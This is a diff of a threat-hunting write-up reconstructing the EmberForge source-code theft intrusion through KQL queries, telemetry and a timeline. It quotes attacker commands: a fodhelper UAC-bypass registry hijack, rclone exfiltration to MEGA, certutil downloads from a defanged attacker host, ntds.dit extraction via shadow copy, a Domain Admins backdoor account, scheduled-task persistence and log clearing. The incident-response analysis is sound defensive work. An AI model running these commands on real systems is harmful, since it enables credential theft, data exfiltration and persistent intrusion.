@@ -13,11 +13,11 @@ permalink: /investigations/emberforge-source-code-theft/
 
 ### Incident Overview
 
-On `2026-01-30`, EmberForge Studios experienced a multi-stage intrusion that began on an artist workstation and progressed to a server and Domain Controller. Available telemetry shows that the attacker gained execution on `EC2AMAZ-B9GHHO6.emberforge.local` after user `lmartin` extracted a downloaded archive, mounted `EmberForge_Review.iso`, and triggered execution of `D:\review.dll` through `rundll32.exe`.
+On `2026-01-30`, EmberForge Studios experienced a multi-stage intrusion that started on an artist workstation and later spread to a server and Domain Controller. The earliest confirmed malicious activity in the reviewed telemetry occurred on `EC2AMAZ-B9GHHO6.emberforge.local`, where user `lmartin` extracted a downloaded archive, mounted `EmberForge_Review.iso`, and then executed `D:\review.dll` through `rundll32.exe`.
 
-From there, the attacker established a follow-on payload in `C:\Users\Public\update.exe`, used a `fodhelper.exe` registry hijack to bypass UAC, dumped LSASS credentials, injected into `spoolsv.exe` running as `NT AUTHORITY\SYSTEM`, and moved laterally to `EC2AMAZ-16V3AU4.emberforge.local`. On the server, the attacker staged tooling from `sync[.]cloud-endpoint[.]net`, configured `AnyDesk`, compressed `C:\GameDev` into `C:\Users\Public\gamedev.zip`, and exfiltrated the archive to MEGA using `rclone.exe`.
+From there, the intrusion moved quickly. The attacker established a follow-on payload in `C:\Users\Public\update.exe`, used a `fodhelper.exe` registry hijack to bypass UAC, created an LSASS dump, injected into `spoolsv.exe` running as `NT AUTHORITY\SYSTEM`, and then pivoted to `EC2AMAZ-16V3AU4.emberforge.local`. On the server, the attacker staged tooling from `sync[.]cloud-endpoint[.]net`, configured `AnyDesk`, compressed `C:\GameDev` into `C:\Users\Public\gamedev.zip`, and exfiltrated that archive to MEGA using `rclone.exe`.
 
-The intrusion also extended to the Domain Controller, `EC2AMAZ-EEU3IA2.emberforge.local`, where the attacker used `vssadmin.exe` to create a shadow copy, copied `ntds.dit`, created a backdoor account named `svc_backup`, added that account to `Domain Admins`, created scheduled task persistence, and cleared event logs with `wevtutil.exe`.
+The compromise also reached the Domain Controller, `EC2AMAZ-EEU3IA2.emberforge.local`, where the attacker used `vssadmin.exe` to create a shadow copy, copied `ntds.dit`, created a backdoor account named `svc_backup`, added that account to `Domain Admins`, created scheduled task persistence, and cleared event logs with `wevtutil.exe`.
 
 ### Key Findings
 
@@ -51,16 +51,16 @@ Because this investigation was performed as a retrospective hunt, the telemetry 
 ### Stakeholder Impact
 
 **Engineering and Product Teams:**  
-The attacker accessed and archived `C:\GameDev` on the server, which strongly suggests exposure of unreleased development material and source code. This is the highest-confidence business impact observed in the reviewed telemetry.
+The attacker accessed and archived `C:\GameDev` on the server, which strongly suggests exposure of unreleased development material and source code. This is the clearest business impact supported by the reviewed telemetry.
 
 **IT and Security Teams:**  
-The compromise extended from a workstation to a server and Domain Controller, which means this wasn't a single-host incident. The attacker obtained privileged execution, accessed credential material, and established persistence.
+This was not a single-host event. The intrusion moved from a workstation to a server and then to the Domain Controller. By that stage, the attacker had privileged execution, access to credential material, and multiple forms of persistence.
 
 **Employees:**  
 The Domain Controller was compromised and `ntds.dit` was copied from a shadow copy. That creates risk for broad credential exposure across domain users and service accounts.
 
 **Leadership and Legal Stakeholders:**  
-The opening brief stated that unreleased source code was on the dark web. While the reviewed telemetry doesn't independently prove publication, it does strongly support theft of source code and compromise of domain credential material.
+The opening brief stated that unreleased source code was on the dark web. While the reviewed telemetry does not independently confirm publication, it does strongly support theft of source code and compromise of domain credential material.
 
 ---
 
@@ -70,7 +70,7 @@ The opening brief stated that unreleased source code was on the dark web. While 
 
 The reviewed telemetry shows confirmed attacker activity on the following systems:
 
-- `EC2AMAZ-B9GHHO6.emberforge.local`,(`10.1.173.145`) the initial workstation
+- `EC2AMAZ-B9GHHO6.emberforge.local` (`10.1.173.145`), the initial workstation
 - `EC2AMAZ-16V3AU4.emberforge.local` (`10.1.57.66`), the server used for staging and exfiltration
 - `EC2AMAZ-EEU3IA2.emberforge.local` (`10.1.160.76`), the Domain Controller
 
@@ -84,7 +84,7 @@ The most important data exposures supported by the evidence are:
 
 ### 1. Initial Access and First Malicious Execution
 
-The opening brief indicated that Lisa Martin observed unusual behavior after opening content from her desktop. To test that lead, process creation events for `user_s == "lmartin"` were reviewed first.
+The opening brief pointed to Lisa Martin’s workstation as the likely starting point, so that was the first place to anchor the timeline. To test that lead, I started with process creation events for `user_s == "lmartin"`.
 
 ```kusto
 EmberForgeX_CL
@@ -100,7 +100,7 @@ That query showed `7zG.exe` running at `2026-01-30 21:24:04.656` on `EC2AMAZ-B9G
 "C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\" -spe -an -ai#7zMap13315:120:7zEvent17197
 ```
 
-To confirm what was extracted, file creation events were pivoted into the same destination path.
+That gave me the extraction path, but not yet the file that mattered. To fill in that gap, I pivoted into file creation events for the same directory.
 
 ```kusto
 EmberForgeX_CL
@@ -115,7 +115,7 @@ That showed `EmberForge_Review.iso` being created at `2026-01-30 21:24:10.848`:
 C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\EmberForge_Review.iso
 ```
 
-From there, the next logical pivot was the DLL name that appeared in follow-on activity.
+At that point, the next logical pivot was the DLL name that surfaced in follow-on execution.
 
 ```kusto
 EmberForgeX_CL
@@ -126,13 +126,13 @@ EmberForgeX_CL
 | sort by UtcTime_s asc 
 ```
 
-At `2026-01-30 21:27:03.300`, `explorer.exe` launched `rundll32.exe` to execute the DLL from the mounted `D:` volume:
+That query showed the first clearly malicious execution in the case. At `2026-01-30 21:27:03.300`, `explorer.exe` launched `rundll32.exe` to execute the DLL from the mounted `D:` volume:
 
 ```text
 "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW
 ```
 
-That is the earliest confirmed malicious execution in the reviewed telemetry.  
+That sequence is important because it ties the user activity, the extracted ISO, and the first payload execution together in a way that is hard to dismiss as routine behavior.
 
 <img width="1318" height="545" alt="Q10_01_7z_extraction" src="https://github.com/user-attachments/assets/3532b085-382e-4201-88a1-a81e329fe7a4" />  
 
@@ -142,13 +142,12 @@ That is the earliest confirmed malicious execution in the reviewed telemetry.
 
 <img width="1679" height="607" alt="Q10_04_what_review_dll_is_doing" src="https://github.com/user-attachments/assets/f33a02fa-a764-4721-9ba3-de9d523e5a40" />  
 
-> DLL execution
+> DLL execution 
+
 
 ### 2. Follow-on Payload Deployment and Early Injection
 
-Once `review.dll` executed, the next question was what persistent payload the attacker add on to the host.
-
-To identify newly created files after the DLL execution window, file creation events on the workstation were reviewed.
+Once `review.dll` executed, the next question was what the attacker added to the host to continue operating. To answer that, I narrowed the view to file creation events on the workstation shortly after the DLL ran.
 
 ```kusto
 EmberForgeX_CL
@@ -161,7 +160,7 @@ EmberForgeX_CL
 
 That query showed a new executable appearing in a world-writable location. At `2026-01-30 21:36:34.586`, `C:\Users\Public\update.exe` was created on `EC2AMAZ-B9GHHO6.emberforge.local`.
 
-To understand how the attacker began hiding execution, `CreateRemoteThread` events were reviewed.
+That made `update.exe` the next major pivot, but before following it further, I checked whether the attacker had already started shifting execution into other processes.
 
 ```kusto
 EmberForgeX_CL 
@@ -177,7 +176,7 @@ At `2026-01-30 21:32:42.708`, the first observed injection chain was:
 rundll32.exe > notepad.exe
 ```
 
-This helped establish that the attacker wasn't staying within the original DLL execution path and was already moving into alternate processes.
+That does not stand on its own as the most important event in the case, but it matters because it shows the attacker was already moving away from the initial DLL execution path and into alternate processes.
 
 <img width="1281" height="481" alt="Q15_Dropper_payload_update_in_public_after_dll_run" src="https://github.com/user-attachments/assets/9f632651-c7a7-4469-bf4e-58b6709e0c29" />  
 
@@ -189,7 +188,7 @@ This helped establish that the attacker wasn't staying within the original DLL e
 
 ### 3. UAC Bypass and Local Privilege Escalation
 
-After identifying `update.exe`, the next step was to determine how it was elevated. Process and registry events on the workstation showed a familiar UAC bypass pattern involving `fodhelper.exe`.
+After identifying `update.exe`, the next step was to see whether it stayed in the original user context or was elevated. Process and registry events on the workstation showed a familiar UAC bypass pattern involving `fodhelper.exe`.
 
 ```kusto
 EmberForgeX_CL 
@@ -211,17 +210,19 @@ At `2026-01-30 21:38:50.829`, `reg.exe` then created the enabling value:
 reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
 ```
 
-The next important process event followed at `2026-01-30 21:39:02.511`:
+The next meaningful process event came right after that. At `2026-01-30 21:39:02.511`, `fodhelper.exe` executed:
 
 ```text
 fodhelper.exe
 ```
 
-This sequence is consistent with the `fodhelper.exe` UAC bypass. The value that enabled the hijack was:
+That sequence is consistent with the `fodhelper.exe` UAC bypass. The value that enabled the hijack was:
 
 ```text
 DelegateExecute
 ```
+
+This is one of those places where the order matters. The registry changes on their own are suspicious. The execution of `fodhelper.exe` immediately after them is what makes the chain persuasive.
 
 <img width="1690" height="614" alt="Q19_UAC_Bypass_fodhelper" src="https://github.com/user-attachments/assets/b1385c33-7b00-4cd7-b72f-d0b43d07ce32" />  
 
@@ -229,11 +230,11 @@ DelegateExecute
 
 ### 4. Beaconing, Credential Access, and Discovery
 
-With a resident payload running at higher privilege, the next questions were whether it beaconed externally, whether it accessed credentials, and what information it gathered from the environment.
+With a resident payload running at higher privilege, the next questions were whether it beaconed externally, whether it touched credentials, and what it learned about the environment.
 
 #### 4.1 Beacon Infrastructure
 
-To identify external communication associated with `update.exe`, DNS query events were reviewed.
+To identify external communication tied to `update.exe`, I reviewed DNS query events for that process.
 
 ```kusto
 EmberForgeX_CL | where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
@@ -255,13 +256,16 @@ The query results included:
 104[.]21[.]30[.]237
 ```
 
+That does not prove full command-and-control on its own, but it does place `update.exe` in contact with attacker-controlled infrastructure using naming that was clearly meant to blend in.
+
 <img width="1154" height="373" alt="Q17_dns_ip_resolution_c2" src="https://github.com/user-attachments/assets/d4dec2a9-68a7-4f60-814f-f2fd23678579" />  
 
 > DNS activity associated with update.exe
 
+
 #### 4.2 Credential Access
 
-To identify dump artifacts, file creation events were filtered for `.dmp` output.
+The next pivot was into file creation events associated with dump artifacts.
 
 ```kusto
 EmberForgeX_CL
@@ -276,16 +280,17 @@ At `2026-01-30 21:48:13.892` on `EC2AMAZ-B9GHHO6.emberforge.local`, `C:\Users\Pu
 ```text
 C:\Windows\System32\lsass.dmp
 ```
-
-> [!NOTE]
 > This supports the assessment that credentials were likely dumped from LSASS despite the absence of ProcessAccess events (Sysmon Event ID 10), which may indicate the dumping tool used direct syscalls to reduce API-monitoring visibility.
 
+This was one of the clearer credential-access artifacts in the case. It also helped explain why the later spread into more privileged systems was able to happen as quickly as it did.
+
 <img width="1124" height="327" alt="Q22_credential_dumping" src="https://github.com/user-attachments/assets/79fb508f-77dd-42a3-8bb9-bd7b8bdcb2a7" />  
+
 > LSASS dump creation
 
 #### 4.3 Discovery
 
-To see what the attacker enumerated after gaining execution, process creation events were filtered to common Living Off the Land (LOTL) binaries.
+To see what the attacker was learning from the environment after gaining execution, I filtered process creation events to common Living Off the Land binaries.
 
 ```kusto
 EmberForgeX_CL
@@ -305,16 +310,16 @@ nltest /dclist:emberforge.local
 whoami /priv
 ```
 
-This shows the attacker confirming the current host, reviewing privilege, enumerating domain accounts and privileged groups, and identifying domain controllers. Additionally, the search
-revealed similar commands executed on server, `EC2AMAZ-16V3AU4` at `2026-01-30 22:08:18.836`.
+This is the sort of sequence that starts to change the shape of the incident. At this point, it was no longer just a suspicious workstation execution chain. The attacker was clearly orienting themselves in the domain and looking for ways to expand access. The same query also showed similar commands later on `EC2AMAZ-16V3AU4`, which helped mark the transition into server-side activity.
 
 <img width="1604" height="605" alt="q24-26_initial_discovery_recon_and_potential_time_of_lateral_movement" src="https://github.com/user-attachments/assets/e4561df2-4a7e-4546-a416-ce061db1b322" />  
 
 > Workstation reconnaissance activity and potential first commands after lateral movement.
 
+
 ### 5. SYSTEM-Level Injection and Transition to Lateral Movement
 
-The next useful pivot was to understand how the attacker moved from a user-context payload into a more stable and privileged process.
+The next useful pivot was figuring out how the attacker moved from a user-context payload into a more stable and privileged process.
 
 ```kusto
 EmberForgeX_CL
@@ -330,15 +335,16 @@ At `2026-01-30 21:56:44.706`, the payload created a remote thread in a different
 update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)
 ```
 
-This was a significant transition point. After this event, `spoolsv.exe` became the parent for multiple high-value actions tied to remote administration, tool transfer, and server targeting.  
+This was a key turning point in the intrusion. After this event, `spoolsv.exe` became the parent for several high-value actions tied to tool transfer, remote access, and server targeting.  
 
-<img width="1546" height="436" alt="Q21_second_proc_injection_from_elelevated_beacon_update" src="https://github.com/user-attachments/assets/0d57d3d4-ada7-4f80-ac47-41f2c2dbc125" />  
+<img width="860" height="581" alt="Q21_second_proc_injection_from_elelevated_beacon_update" src="https://github.com/user-attachments/assets/8f665f50-e945-495a-aa57-4ecc66034a11" />  
 
 > Elevated process spoolsv.exe, PID 2340
 
+
 ### 6. Workstation-Based Spread and Remote Access Preparation
 
-Once `spoolsv.exe` became the attacker’s execution parent, the next step was to inspect its child processes.
+Once `spoolsv.exe` became the attacker’s execution parent, I looked at its child processes to understand how the next stage of the intrusion unfolded.
 
 ```kusto
 EmberForgeX_CL
@@ -356,6 +362,8 @@ At `2026-01-30 22:14:55.324`, the attacker copied the payload to the server:
 cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe
 ```
 
+That is the clearest evidence for how the second beacon moved from the workstation to the server.
+
 The same parent-child relationship also showed installation and configuration of `AnyDesk`, including:
 
 ```text
@@ -367,7 +375,7 @@ cmd.exe /c "net stop AnyDesk"
 cmd.exe /c "net start AnyDesk"
 ```
 
-This suggests the attacker dropped the remote monitoring and management (RMM) tool, but that the AnyDesk services was stopped then started.  
+That suggests more than a simple drop-and-run. The attacker appears to have changed the configuration and then restarted the service so those settings would take effect.
 
 The same host also showed preparation for broader movement:
 
@@ -391,30 +399,27 @@ EmberForgeX_CL
 | sort by UtcTime_s asc
 ```
 
-These changes support a broader lateral movement and staging workflow.
+By this point, the attacker had a privileged execution context, a remote access tool, a share created for staging, and inbound SMB enabled. That is the point in the case where the lateral movement story starts to feel complete rather than speculative.
 
 <img width="1732" height="509" alt="Q29_processes_initated_by_update_after_elevating_to_system" src="https://github.com/user-attachments/assets/69150331-fb90-4d56-80b1-9852f4cf9f92" />  
 
 > Lateral transfer of `update.exe` to the server
 
-
 <img width="1501" height="248" alt="Q27_share_added_tool_staging" src="https://github.com/user-attachments/assets/80daa332-bca0-42a8-bc52-da105a810830" />  
 
->The `tools` share being created
+> The `tools` share being created
 
 <img width="1163" height="458" alt="Q28_firewall_rule_added" src="https://github.com/user-attachments/assets/cb75194e-a9e9-4e32-a750-a3e226f22829" />  
 
 > SMB firewall rule creation
 
-
 <img width="1748" height="509" alt="AnyDesk_Conf_settings" src="https://github.com/user-attachments/assets/fd397f5b-58ba-4b29-9038-d86d2da54f19" />  
 
 > AnyDesk installation and configuration
 
+### 7. Server Compromise, Tool Staging, and Remote Execution
 
-### 7. Server Compromise, Tool Staging, and Service-Based Remote Execution
-
-After confirming that `update.exe` was copied to the server, the next step was to understand how the attacker executed there and whether they used additional delivery methods.
+After confirming that `update.exe` was copied to the server, the next step was to understand how the attacker operated there and whether they relied only on SMB transfer.
 
 To identify download and transfer utilities across the environment:
 
@@ -444,24 +449,24 @@ EmberForgeX_CL
 | sort by SystemTime_s asc
 ```
 
-That query revealed several randomly named services, typical of some remote access tools, as well as the `AnyDesk Service`.
+That query revealed several randomly named services, as well as the `AnyDesk Service`.
 
-The associated service paths used by the randomly named services used `%COMSPEC%`, temporary batch files, and redirected output to `\\%COMPUTERNAME%\C$\__output_*`, which is consistent with service-based remote execution.  
+The service paths tied to those randomly named services used `%COMSPEC%`, temporary batch files, and redirected output to `\\%COMPUTERNAME%\C$\__output_*`, which is consistent with service-based remote execution.
+
 
 <img width="1381" height="557" alt="service_installation_events" src="https://github.com/user-attachments/assets/9dc2bea4-cf9b-4ec0-9603-7e2f20daf261" />  
 
-> Temporary services used for remote execution and Any Desk Service
+> Temporary services used for remote execution and AnyDesk Service
 
 <img width="1685" height="529" alt="Q9_Staging_Server_identified" src="https://github.com/user-attachments/assets/d9017b47-7bc8-4935-a1ad-59fe997fc393" />  
 
->  Tool staging on the server
-
+> Tool staging on the Server
 
 ### 8. Collection and Archive Creation on the Server
 
-Once the server was fully compromised, the next question was what data did the attacker target before exfiltration?
+Once the Server was clearly in play, the next question was what data the attacker actually targeted before exfiltration.
 
-To locate compression and archiving activity, process creation was filtered to common archive extensions.
+To locate compression and archive-related activity, process creation was filtered to common archive extensions.
 
 ```kusto
 EmberForgeX_CL
@@ -476,26 +481,22 @@ At `2026-01-30 23:11:28.112` on `EC2AMAZ-16V3AU4.emberforge.local`, PowerShell r
 powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
 ```
 
-This is important because it shows both the input and output directly:
+This is one of the cleaner pieces of evidence in the case because it shows both sides of the action directly:
 
 - Source directory: `C:\GameDev`
 - Archive output: `C:\Users\Public\gamedev.zip`
 
-
+At that point, the collection target was no longer a guess.
 
 <img width="1669" height="516" alt="Q1_file_path_of_stolen_data" src="https://github.com/user-attachments/assets/ffd97d79-2f53-4ed9-ab21-7ecba73f11b1" />  
 
 > Compression of the GameDev directory
 
-
-
 ### 9. Exfiltration to MEGA
 
-After confirming the archive path, the next pivot was into the exfiltration tool and the network connection that supported it.
+After confirming the archive path, the next pivot was into the exfiltration tool and the network activity that supported it.
 
-`rclone.exe` execution was revealed from the previous KQL query for process creation events to identify zip file extensions in the commandline.  
-
-Explicitly searching for process creation events for `rclone.exe`:
+`rclone.exe` first surfaced in the earlier archive-related process review. To isolate it more cleanly, I ran a narrower process query focused on its command line.
 
 ```kusto
 EmberForgeX_CL
@@ -510,7 +511,7 @@ At `2026-01-30 23:08:28.665`, the attacker ran:
 C:\Users\Public\rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton[.]me --mega-pass Summer2024! -v
 ```
 
-This execution exposed the cloud username and plaintext password directly in the command line.
+This exposed the cloud username and plaintext password directly in the command line.
 
 At `2026-01-30 23:11:44.379`, a later `rclone.exe` execution used the staged archive:
 
@@ -535,22 +536,21 @@ Destination host: bt5[.]api[.]mega[.]co[.]nz
 Destination IP:   66[.]203[.]125[.]15
 ```
 
-Taken together, these events support exfiltration of `gamedev.zip` to MEGA from the server.  
+Taken together, these events support exfiltration of `gamedev.zip` to MEGA from the server.
 
 <img width="1672" height="493" alt="Q2_Exfil_Destination_Cloud_Service" src="https://github.com/user-attachments/assets/00dd412d-eb8e-4659-81e7-3b684c55d479" />  
 
 <img width="1658" height="643" alt="Q3_Attacker_Attribution_email_address" src="https://github.com/user-attachments/assets/47e3d2a6-f03b-4fdb-9ee8-6d279f46cd6e" />  
 
-> Attacker credentials exposed in `rclone.exe` commandline
+> Attacker credentials exposed in `rclone.exe` command line
 
 <img width="1388" height="521" alt="Q6_Exfil_Destination_ip" src="https://github.com/user-attachments/assets/ba2b7eaf-ddd7-4149-b9a0-0a3e9104676e" />  
 
 > Network evidence of `rclone.exe` and MEGA
 
-
 ### 10. Domain Controller Compromise and `ntds.dit` Extraction
 
-The next major shift in scope came from activity on the Domain Controller. To understand what happened there, process creation was reviewed for `EC2AMAZ-EEU3IA2`.
+The next major change in scope came from activity on the Domain Controller. To understand what happened there, I reviewed process creation for `EC2AMAZ-EEU3IA2`.
 
 ```kusto
 EmberForgeX_CL
@@ -563,7 +563,7 @@ EmberForgeX_CL
 
 The first observed command on the Domain Controller was `whoami` at `2026-01-30 23:19:21.118`, which is a common first step once an attacker lands on a new host.
 
-The next pivot focused on shadow-copy and credential-database activity.
+From there, the next pivot was into shadow-copy and credential-database access.
 
 ```kusto
 EmberForgeX_CL
@@ -607,19 +607,17 @@ At `2026-01-30 23:35:17.505`:
 vssadmin delete shadows /shadow="{0ed56514-fe1b-4ef9-a2b1-d468122c1920}" /Quiet
 ```
 
-That sequence is strong evidence for deliberate shadow-copy abuse to access the locked Active Directory database.
+This is one of the stronger sequences in the entire case. It shows the attacker listing shadows, creating one, copying `ntds.dit`, and then cleaning up behind themselves.
 
-<img width="1715" height="435" alt="dc_shadowcopy_ntds_extraction" src="https://github.com/user-attachments/assets/93831746-cb29-4c0b-b601-6be0388326f6" />  
+<img width="1621" height="458" alt="dc_shadowcopy_ntds_extraction" src="https://github.com/user-attachments/assets/b31f31cf-585d-4570-8b31-c1d47e01f1b7" />
 
->  Shadow-copy abuse and ntds.dit extraction
-
-
+> Shadow-copy abuse and `ntds.dit` extraction
 
 ### 11. Domain Persistence, Privilege Escalation, and Evidence Removal
 
-Once the Domain Controller was compromised, the attacker moved into persistence, privilege escalation, and evidence deletion.
+Once the attacker reached the Domain Controller, the focus shifted from access to control. Up to this point, the activity already supported a serious compromise. What came next made it clear that the attacker was not just exploring the environment. They were putting down persistence, expanding privilege, and starting to clean up behind themselves.
 
-To isolate the backdoor account creation and group modification:
+To isolate the domain-level changes, I first looked for process creation events tied to the new account name and privileged group modification.
 
 ```kusto
 EmberForgeX_CL
@@ -631,19 +629,21 @@ EmberForgeX_CL
 | sort by todatetime(UtcTime_s) asc
 ```
 
-At `2026-01-30 23:38:11.819`, the attacker created:
+That query showed the attacker creating a new domain account at `2026-01-30 23:38:11.819`:
 
 ```text
 net user svc_backup P@ssw0rd123! /add /domain
 ```
 
-At `2026-01-30 23:39:37.986`, the attacker elevated the account:
+A little over a minute later, at `2026-01-30 23:39:37.986`, the attacker elevated that same account into `Domain Admins`:
 
 ```text
 net group "Domain Admins" svc_backup /add /domain
 ```
 
-The next relevant pivot showed share-access credentials passed in plaintext:
+This was a useful place to stop and take stock. By that stage, the attacker had already accessed the Domain Controller and copied `ntds.dit`. Creating `svc_backup` and then adding it to `Domain Admins` suggests they were not relying on a single access path. They were building a way back in.
+
+The next pivot was into share-access activity, because the DC process timeline also suggested the attacker was still moving files around the environment.
 
 ```kusto
 EmberForgeX_CL
@@ -655,13 +655,15 @@ EmberForgeX_CL
 | sort by todatetime(UtcTime_s) asc
 ```
 
-At `2026-01-30 23:45:25.132`:
+At `2026-01-30 23:45:25.132`, the attacker mapped a share using plaintext credentials:
 
 ```text
 net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!
 ```
 
-The attacker also established task-based persistence:
+That command matters for two reasons. First, it exposed another set of credentials directly in process telemetry. Second, it showed the attacker still relying on shares as part of their movement and staging workflow, even after gaining Domain Controller access.
+
+The next step was to check whether the attacker established task-based persistence on the Domain Controller.
 
 ```kusto
 EmberForgeX_CL
@@ -673,13 +675,15 @@ EmberForgeX_CL
 | sort by todatetime(UtcTime_s) asc
 ```
 
-At `2026-01-30 23:47:38.302`:
+That query showed the following at `2026-01-30 23:47:38.302`:
 
 ```text
 schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\update.exe" /sc onstart /ru system
 ```
 
-Finally, the attacker cleared logs with `wevtutil.exe`:
+By this point, the pattern was pretty clear. The attacker had already used account creation and privilege assignment for persistence. The scheduled task added another path, this time tied directly to the payload in `C:\Users\Public\update.exe`.
+
+The last piece in this section was evidence removal. To check whether the attacker had started tampering with logs, I filtered process creation on the Domain Controller for `wevtutil`.
 
 ```kusto
 EmberForgeX_CL
@@ -691,18 +695,18 @@ EmberForgeX_CL
 | sort by todatetime(UtcTime_s) asc
 ```
 
-Observed commands included:
+That query showed the attacker clearing both logs below:
 
 ```text
 wevtutil cl Security
 wevtutil cl System
 ```
 
-This shows not only domain persistence and privilege expansion, but also clear evidence of defense evasion.  
+Taken together, this section shows more than just post-compromise activity on the Domain Controller. It shows the attacker creating a backdoor account, granting it domain-wide privilege, using plaintext credentials to access a share, establishing persistence with a scheduled task, and then clearing logs to make reconstruction harder.
 
 <img width="1700" height="470" alt="backdoor_account_creation" src="https://github.com/user-attachments/assets/2762b6a5-1e88-429d-ada2-5b03ec8e8bb5" />  
 
-> Backdoor account creation and Domain Admins membership
+> Backdoor account creation and `Domain Admins` membership
 
 <img width="1590" height="513" alt="share_access_with_credentials" src="https://github.com/user-attachments/assets/a9b36b38-d221-4732-be18-3b0f8aaae746" />  
 
@@ -710,7 +714,7 @@ This shows not only domain persistence and privilege expansion, but also clear e
 
 <img width="1653" height="561" alt="scheduled_task_persistence_via_service" src="https://github.com/user-attachments/assets/3697ae36-2a6d-4d89-9d41-74a6eb18f408" />  
 
-> Scheduled task `WindowsUpate` persistence on the Domain Controller
+> Scheduled task `WindowsUpdate` persistence on the Domain Controller
 
 <img width="999" height="613" alt="security_system_log_cleared" src="https://github.com/user-attachments/assets/006ef1a4-ccb8-4ae1-8cda-91b0d6ad0a5d" />  
 
@@ -752,15 +756,54 @@ This shows not only domain persistence and privilege expansion, but also clear e
 
 The immediate root cause supported by the reviewed telemetry was user execution of content that led to extraction of `EmberForge_Review.iso`, mounting of that ISO, and execution of `D:\review.dll` via `rundll32.exe` on `EC2AMAZ-B9GHHO6.emberforge.local`.
 
-Several control gaps appear to have enabled the intrusion to progress:
+Several control gaps appear to have allowed the intrusion to progress:
 
 - The attacker was able to execute content from a mounted ISO without being stopped before payload execution.
 - A world-writable path, `C:\Users\Public\`, was used repeatedly for staging and execution of tooling.
 - UAC bypass through the `ms-settings` registry hijack succeeded, which suggests insufficient prevention or detection around that behavior.
-- The attacker used both legitimate tooling and built-in utilities, including `Compress-Archive`, `certutil.exe`, `vssadmin.exe`, `net.exe`, `netsh.exe`, `wevtutil.exe`, and `schtasks.exe`, which reduced the need for obviously malicious binaries.
-- The attacker was able to move laterally using SMB shares and later access the Domain Controller, which suggests that segmentation or privilege boundaries were not sufficient to contain the compromise after the initial foothold.
+- The attacker relied heavily on legitimate tooling and built-in utilities, including `Compress-Archive`, `certutil.exe`, `vssadmin.exe`, `net.exe`, `netsh.exe`, `wevtutil.exe`, and `schtasks.exe`, which reduced the need for obviously malicious binaries.
+- The attacker was able to move laterally using SMB shares and later access the Domain Controller, which suggests segmentation or privilege boundaries were not sufficient to contain the compromise after the initial foothold.
 
 The full delivery path before the archive extraction wasn't fully reconstructed from the reviewed notes, so I don't want to overclaim a confirmed phishing chain or exact pre-execution origin. That said, the workstation execution chain itself is strongly supported by the available telemetry.
+
+## Technical Timeline
+
+| Time (UTC) | Host | Activity |
+|---|---|---|
+| `2026-01-30 21:24:04.656` | `EC2AMAZ-B9GHHO6` | `7zG.exe` extracts content into `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\` |
+| `2026-01-30 21:24:10.848` | `EC2AMAZ-B9GHHO6` | `EmberForge_Review.iso` created |
+| `2026-01-30 21:27:03.300` | `EC2AMAZ-B9GHHO6` | `rundll32.exe` executes `D:\review.dll,StartW` |
+| `2026-01-30 21:32:42.708` | `EC2AMAZ-B9GHHO6` | `rundll32.exe > notepad.exe` injection |
+| `2026-01-30 21:36:34.586` | `EC2AMAZ-B9GHHO6` | `C:\Users\Public\update.exe` created |
+| `2026-01-30 21:38:33.686` | `EC2AMAZ-B9GHHO6` | Registry hijack for `ms-settings\shell\open\command` begins |
+| `2026-01-30 21:39:02.511` | `EC2AMAZ-B9GHHO6` | `fodhelper.exe` executes |
+| `2026-01-30 21:40:24.206` | `EC2AMAZ-B9GHHO6` | `update.exe` begins querying `cdn[.]cloud-endpoint[.]net` |
+| `2026-01-30 21:48:13.892` | `EC2AMAZ-B9GHHO6` | `Update.exe` creates `C:\Windows\System32\lsass.dmp` |
+| `2026-01-30 21:56:44.706` | `EC2AMAZ-B9GHHO6` | `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` |
+| `2026-01-30 22:07:45.9754850Z` | `EC2AMAZ-16V3AU4` | Temporary service `MzLblBFm` appears on the server |
+| `2026-01-30 22:10:52.789` | `EC2AMAZ-16V3AU4` | `certutil.exe` downloads `AnyDesk.exe` from `sync[.]cloud-endpoint[.]net` |
+| `2026-01-30 22:14:55.324` | `EC2AMAZ-B9GHHO6` | `update.exe` copied to the server over `\\10[.]1[.]57[.]66\C$` |
+| `2026-01-30 22:17:01.4134194Z` | `EC2AMAZ-16V3AU4` | PowerShell `IWR` downloads `update.exe` on the server |
+| `2026-01-30 22:18:01.9717240Z` | `EC2AMAZ-16V3AU4` | `certutil.exe` downloads `update.exe` on the server |
+| `2026-01-30 22:19:34.895` | `EC2AMAZ-B9GHHO6` | `AnyDesk.exe` installed on the workstation |
+| `2026-01-30 22:51:36.903` | `EC2AMAZ-B9GHHO6` | `tools` share created on `C:\Users\Public` |
+| `2026-01-30 22:54:09.948` | `EC2AMAZ-B9GHHO6` | Inbound SMB firewall rule added |
+| `2026-01-30 23:08:28.665` | `EC2AMAZ-16V3AU4` | `rclone.exe` run with plaintext MEGA credentials |
+| `2026-01-30 23:11:28.112` | `EC2AMAZ-16V3AU4` | `Compress-Archive` stages `C:\GameDev` into `gamedev.zip` |
+| `2026-01-30 23:11:44.379` | `EC2AMAZ-16V3AU4` | `rclone.exe` uploads `gamedev.zip` to MEGA |
+| `2026-01-30 23:12:53.154` | `EC2AMAZ-16V3AU4` | `rclone.exe` connects to `bt5[.]api[.]mega[.]co[.]nz` at `66[.]203[.]125[.]15` |
+| `2026-01-30 23:19:21.118` | `EC2AMAZ-EEU3IA2` | First observed command on the Domain Controller, `whoami` |
+| `2026-01-30 23:34:56.069` | `EC2AMAZ-EEU3IA2` | `vssadmin list shadows /for=C:` |
+| `2026-01-30 23:35:04.575` | `EC2AMAZ-EEU3IA2` | `vssadmin create shadow /For=C:` |
